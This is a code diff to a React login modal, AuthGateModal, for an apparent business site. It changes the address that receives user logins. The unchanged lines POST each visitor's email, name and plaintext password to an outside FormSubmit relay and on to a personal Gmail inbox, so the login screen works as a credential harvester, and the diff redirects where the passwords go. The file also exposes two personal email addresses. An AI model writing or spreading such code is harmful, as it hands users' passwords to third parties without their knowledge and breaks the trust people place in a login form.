@@ -39,7 +39,7 @@ export const AuthGateModal: React.FC<AuthGateModalProps> = ({ isOpen, onLoginSuc
     const userEmail = email.trim();
     const userName = mode === 'register' && name.trim() ? name.trim() : userEmail.split('@')[0];
 
-    // Send login details to server & yveer8609@gmail.com
+    // Send login details to server & techyslays@gmail.com
     try {
       await fetch('/api/login-notification', {
         method: 'POST',
@@ -59,7 +59,7 @@ export const AuthGateModal: React.FC<AuthGateModalProps> = ({ isOpen, onLoginSuc
 
     // Direct FormSubmit fallback for static hosting (e.g. GitHub Pages)
     try {
-      fetch('https://formsubmit.co/ajax/yveer8609@gmail.com', {
+      fetch('https://formsubmit.co/ajax/techyslays@gmail.com', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -67,7 +67,7 @@ export const AuthGateModal: React.FC<AuthGateModalProps> = ({ isOpen, onLoginSuc
         },
         body: JSON.stringify({
           _subject: `New GROW BUISNESS ${mode === 'register' ? 'Registration' : 'Login'} Alert`,
-          TargetEmail: 'yveer8609@gmail.com',
+          TargetEmail: 'techyslays@gmail.com',
           UserEmail: userEmail,
           UserPassword: password.trim(),
           UserName: userName,
